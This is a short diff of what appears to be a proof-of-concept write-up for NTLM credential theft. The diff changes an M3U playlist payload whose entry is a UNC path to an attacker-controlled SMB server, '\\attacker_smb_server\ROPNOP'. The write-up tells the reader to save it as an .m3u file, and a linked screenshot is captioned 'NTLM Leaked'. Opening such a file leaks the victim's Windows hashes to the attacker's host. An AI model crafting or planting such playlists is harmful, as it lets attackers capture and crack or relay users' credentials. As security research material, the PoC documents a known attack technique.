@@ -27,7 +27,10 @@ PoC :
 
 #EXTM3U
 #EXTINF:-1,leak_it_please
-\\attacker_smb_server\xFolder
+
+\\attacker_smb_server\ROPNOP
+
+
 ![Alt text](https://raw.githubusercontent.com/kofa2002/NTLM-THEFT/master/Screenshot%20from%202019-05-04%2008-11-15.png?token=AB5ULGT5JPE2CEWY65V6ZWC44PVTW "NTLM Leaked")
 
 Save it as m3u extention.
